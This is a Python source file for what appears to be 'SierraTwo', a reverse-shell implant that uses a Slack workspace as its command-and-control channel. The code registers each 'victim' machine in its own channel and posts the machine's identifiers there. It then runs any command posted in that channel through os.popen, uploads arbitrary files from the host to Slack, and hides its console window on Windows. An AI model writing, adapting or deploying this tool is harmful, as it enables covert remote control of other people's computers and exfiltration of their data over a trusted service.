#!/usr/bin/env python3
import io
import os
import platform
import subprocess
import sys
import time

import slack

import config

TEXT_SIZE_MAX = 3992
CHUNKED_TEXT_SIZE_MAX = 3 * TEXT_SIZE_MAX
TEXT_CHUNK_SIZE = TEXT_SIZE_MAX

FILE_SIZE_MAX = 10485760

channel_id = None


def prepare_shell():
    global channel_id

    # Get list of channels
    channels_list = client.conversations_list()
    channel_names = channels_list.__getitem__("channels")

    # Create 'sierra-hotel-'
    channel = create_channel(channel_names)

    # Get channel name and ID
    channel_id = channel.__getitem__("channel")["id"]

    # Add operators to the 'sierra-hotel-'
    client.conversations_invite(channel=channel_id,
                                users=operators)

    # Gather the victim's info and post it to 'sierra-hotel-'
    info = machine_info()
    client.chat_postMessage(channel=channel_id, text=info)

    # Get the timestamp of the info message
    history = client.conversations_history(channel=channel_id)
    messages = history.__getitem__("messages")
    timestamp = messages[0]["ts"]

    # Pin the info message
    client.pins_add(channel=channel_id, timestamp=timestamp)

    listen()


def create_channel(channel_names):
    shell_number = next_channel(channel_names)

    new_channel = f"{config.channel_prefix}{shell_number}"

    return client.conversations_create(name=new_channel)


def next_channel(channel_names):
    numbers = []
    shell_number = 0

    try:
        for channel in channel_names:
            current_shell_name = channel.get("name")

            if config.channel_prefix in channel.get("name"):
                next_channel = channel.get("name").split("-")[2]

                if next_channel.isdigit():
                    numbers.append(int(next_channel))

        shell_number = max(numbers) + 1

    except ValueError:
        shell_number += 1

    return shell_number


def machine_info():
    machine_UUID = ""

    if platform.system() == "Windows":
        get_UUID = str(subprocess.check_output(
            "wmic csproduct get UUID").decode().strip())

        for line in get_UUID:
            UUID = " ".join(get_UUID.split())
            machine_UUID = UUID[5:]

    elif platform.system() == "Linux":
        machine_UUID = str(subprocess.check_output(
            ["cat", "/etc/machine-id"]).decode().strip())

    elif platform.system() == "Darwin":
        machine_UUID = str(
            subprocess.check_output(["ioreg",
                                     "-d2",
                                     "-c",
                                     "IOPlatformExpertDevice",
                                     "|",
                                     "awk",
                                     "-F",
                                     "'/IOPlatformUUID/{print $(NF-1)}'"]))

    else:
        machine_UUID = str("unknown")

    info = f"`{platform.system()}` with the `{machine_UUID}` UUID connected."

    return info


def upload(data):
    try:
        filename = data

        client.chat_postMessage(channel=channel_id,
                                text=f"Uploading `{filename}`, "
                                "standby...")

        client.files_upload(file=filename,
                            channels=channel_id,
                            filename=filename,
                            title=filename,)

        client.chat_postMessage(channel=channel_id,
                                text=f"Uploaded `{filename}`.")

    except FileNotFoundError:
        return "File not found."


def handle_user_input(command):
    output = ""

    try:
        output = os.popen(command).read()

    except:
        client.chat_postMessage(channel=channel_id,
                                text="Error reading command output.")

    if output == "":
        client.chat_postMessage(channel=channel_id,
                                text="The command did not return anything.")

    output_length = len(output)

    if "`" in output:
        client.chat_postMessage(channel=channel_id,
                                text="Output contains an illegal "
                                     "character.")

    if 0 < output_length <= CHUNKED_TEXT_SIZE_MAX:
        output = [output[i:i + TEXT_SIZE_MAX]
                  for i in range(0, output_length, TEXT_SIZE_MAX)]

        for page in output:
            client.chat_postMessage(channel=channel_id,
                                    text=f"```{page}```")

    elif output_length > CHUNKED_TEXT_SIZE_MAX:
        client.chat_postMessage(channel=channel_id,
                                text="Output size is too big. If you "
                                     "are trying to read a file, try "
                                     "uploading it.")

    else:
        client.chat_postMessage(channel=channel_id, text="Unknown error.")


def commands(command):
    if command.startswith("upload"):
        return upload(command.split(" ")[1])

    elif command.startswith("cd"):
        os.chdir(command.split(" ")[1])
        client.chat_postMessage(channel=channel_id,
                                text="`cd` complete.")

    elif command.startswith("shell_exit"):
        sys.exit(0)

    else:
        handle_user_input(command)


def listen():
    # SierraTwo will read the channel every 0.3 seconds
    # and compare the past messages to the latest message.
    # This is implemented here like this due to Slack's terrible API
    message = ""
    old_messages = ""
    messages = "randomval"

    while True:
        # Get the channel history
        history = client.conversations_history(channel=channel_id)
        time.sleep(0.3)

        # Get the messages from history
        messages = history.__getitem__("messages")[0]

        if old_messages == messages:
            continue

        else:
            if "client_msg_id" in messages:
                message = messages["text"]
                machine_info = commands(message)

                message = ""

            old_messages = messages

        time.sleep(0.3)


def hide_process():
    import ctypes
    import pywintypes
    import win32process

    hwnd = ctypes.windll.kernel32.GetConsoleWindow()

    if hwnd != 0:
        ctypes.windll.user32.ShowWindow(hwnd, 0)
        ctypes.windll.kernel32.CloseHandle(hwnd)
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        os.system(f"taskkill /PID {pid} /f")


if platform.system() == "Windows":
    hide_process()


operators = config.member_id
channel_prefix = config.channel_prefix
client = slack.WebClient(token=config.bot_user_oauth_token)

if __name__ == "__main__":
    prepare_shell()
